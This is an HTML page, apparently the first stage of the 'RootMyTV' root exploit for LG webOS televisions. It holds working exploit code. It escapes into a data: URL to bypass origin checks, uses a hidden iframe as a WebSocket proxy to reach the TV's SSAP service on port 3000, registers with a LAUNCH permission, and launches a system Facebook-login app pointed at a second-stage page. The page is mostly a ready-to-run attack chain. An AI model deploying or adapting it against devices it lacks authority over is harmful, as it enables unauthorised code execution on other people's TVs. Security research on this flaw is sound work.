<html>

<head>
  <title>RootMyTV - Stage 1</title>
  <link rel="stylesheet" href="common.css" />
</head>

<body>
  <header>
    <h1>RootMy.TV</h1>
  </header>
  <hr>
  <section class="content-center">
    <button id="exploit" class="slider-bar">
      Press to root
    </button>
    <article>
      <pre id="log"></pre>
    </article>
  </section>

  <script>
    window.ORIGIN_URL = window.location.protocol === 'data:' ? '__START_ORIGIN__' : window.location.href;

    window.onerror = function (err) {
      console.error(err);
      alert('error: ' + JSON.stringify(err) + '\n' + err.fileName + ' ' + err.lineNumber);
    };
  </script>
  <script>
    // Exploit data: url navigation for browsers which didn't have following patch
    // applied yet (webOS 3.x):
    // https://chromium.googlesource.com/chromium/src.git/+/130ee686fa00b617bfc001ceb3bb49782da2cb4e
    try {
      if (window.location.protocol !== 'data:') {
        window.location = 'data:text/html;base64,' + btoa(document.documentElement.innerHTML
          .replace('="common.css"', '="' + new URL('common.css', window.location.href).href + '"')
          .replace('__START_ORIGIN__', window.location.href));
      }
    } catch (err) {}

    function log(str) {
      var logBox = document.querySelector('#log');
      logBox.innerText = str + '\n' + logBox.innerText;
    }

    // Minimal implementation of WebSocket API that we use to workaround origin
    // filtering in SSAP (LG Connect Apps) server. data: origins result in Origin:
    // null header to be sent, which is explicitly allowed.
    function ProxyWebSocket(target) {

      // Proxy payload - this function is run in data: iframe and is meant to exchange
      // WebSocket calls and events with parent frame.
      function proxyPayload(address) {
        // Helper function that forwards events/messages to parent frame
        function forward(type, data) {
          window.parent.postMessage(JSON.stringify({type: type, data: data}), "*");
        }

        try {
          var conn = new WebSocket(address);
          conn.onopen = function (evt) {forward('open', evt);}
          conn.onclose = function (evt) {forward('close', evt);}
          conn.onerror = function (evt) {forward('error', evt);}
          conn.onmessage = function (evt) {forward('message', {data: evt.data});}
          window.addEventListener("message", function (event) {
            var msg = JSON.parse(event.data);
            if (msg.type === 'send') {
              conn.send(msg.data);
            }
          }, false);
        } catch (err) {
          forward('error', err);
        }
      }

      var self = this;
      this.proxy = document.createElement('iframe');
      this.proxy.style.display = 'none';
      this.proxy.setAttribute('src', 'data:text/html;base64,' + btoa('<' + 'script>' + proxyPayload.toString() + ';proxyPayload(' + JSON.stringify(target) + ');</' + 'script>'));
      window.addEventListener("message", function (event) {
        if (event.source !== self.proxy.contentWindow) return;
        const msg = JSON.parse(event.data);
        if (msg.type === 'message' && self.onmessage) self.onmessage(msg.data);
        if (msg.type === 'close' && self.onclose) self.onclose(msg.data);
        if (msg.type === 'error' && self.onerror) self.onerror(msg.data);
        if (msg.type === 'open' && self.onopen) self.onopen(msg.data);
        if (msg.type === 'log') console.info('proxy:', msg.data);
      }, false);
      document.querySelector('body').appendChild(this.proxy);
      return this;
    }
    ProxyWebSocket.prototype.send = function (data) {
      this.proxy.contentWindow.postMessage(JSON.stringify({type: 'send', data: data}), '*');
    }
    ProxyWebSocket.prototype.close = function () {
      this.proxy.parentNode.removeChild(this.proxy);
    }

    // Final exploit code
    var conn = null;
    function bootstrap(target, url) {
      try {
        log('0. Connecting...');

        if (conn) {try {conn.close();} catch (err) {alert(err.message)} }
        conn = new ProxyWebSocket('ws://' + target + ':3000');
        conn.onopen = function (evt) {
          console.info('open', evt);
          log('1. Connected, registering... Accept prompt on the TV.');
          const handshake = {
            id: "reg_req",
            type: "register",
            payload: {
              forcePairing: false,
              pairingType: "PROMPT",
              "client-key": "xxx",

              // Minimal manifest that gives us permission to launch a system
              // application
              manifest: {
                manifestVersion: 1,
                permissions: ["LAUNCH"],
              },
            }
          };
          conn.send(JSON.stringify(handshake));
        };

        conn.onmessage = function (evt) {
          const msg = JSON.parse(evt.data);

          if (msg.type === 'registered') {
            log('2. Registered - opening webpage...');
            conn.send(JSON.stringify({
              id: 'launch_req',
              type: "request",
              uri: "ssap://system.launcher/launch",
              payload: {
                id: "com.webos.app.facebooklogin",
                params: {
                  server: url.replace('http://', '').replace('https://', '') + "#",
                }
              },
            }));
          } else if (msg.type === 'response') {
            if (msg.payload.returnValue === true && msg.id === 'launch_req') {
              log('2. Launch request finished');
            } else if (msg.id !== 'reg_req') {
              log('Unexpected response: ' + evt.data);
            }
          } else if (msg.type === 'error') {
            log('Unexpected message, connection prompt likely declined:\n' + evt.data);
          } else {
            log('Unexpected message: ' + evt.data);
          }
        };
        conn.onclose = function (evt) {
          console.info('close', evt);
          log('Closed');
        };
        conn.onerror = function (evt) {
          console.info('error', evt);
          if (evt.message && evt.message.indexOf('insecure') !== -1) {
            log('Error occured during connection... Attempting data URL hack...');
          } else {
            log('Error occured during connection - Do you have LG Connect Apps enabled?');
          }
        };
      } catch (err) {
        log("An unexpected error occured: " + err.toString());
      }
    }

    document.querySelector('#exploit').addEventListener('click', function () {
      bootstrap('localhost', new URL('stage2.html', ORIGIN_URL).href);
    });
  </script>
</body>

</html>
